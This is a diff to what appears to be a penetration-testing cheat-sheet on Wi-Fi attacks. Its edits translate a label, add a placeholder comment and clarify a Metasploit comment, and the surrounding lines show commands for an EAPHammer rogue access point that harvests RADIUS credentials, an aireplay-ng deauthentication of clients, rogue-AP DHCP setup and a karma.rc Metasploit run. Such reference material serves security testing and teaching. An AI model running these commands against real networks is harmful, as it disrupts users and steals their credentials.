@@ -17,7 +17,7 @@ WPA EAP refers to the use of the Extensible Authentication Protocol (EAP) within
     ./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
 
     # deauth users and wait for them to connect to our AP
-    aireplay-ng -0 0 -a MAC_ADDR_AP -c MAC_ADDR_CIBLE wlan0mon
+    aireplay-ng -0 0 -a MAC_ADDR_AP -c MAC_ADDR_TARGET wlan0mon
     ```
 
 * [Stealing RADIUS Credentials Using EAPHammer](https://github.com/s0lst1c3/eaphammer/wiki/II.-Stealing-RADIUS-Credentials-Using-EAPHammer)
@@ -72,6 +72,7 @@ mkdir -p /var/run/dhcpd
 chown -R dhcpd:dhcpd /var/run/dhcpd
 touch /var/lib/dhcp3/dhcpd.leases
 
+# The following line is a placeholder. Replace it with a valid dhcpd.conf configuration.
 "CONF DHCP FROM VIDEO 75" > /tmp/dhcpd.conf
 
 touch /tmp/dhcp.log
@@ -79,7 +80,7 @@ chown -R dhcpd:dhcpd /tmp/dhcp.log
 dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp/log at0
 
 karma.rc from metasploit
-# comment the first 2 lines (load sqlite)
+# comment the first 2 lines (e.g., load db_sqlite3 and db_connect)
 msfconsole -r /root/karma.rc
 ```
 
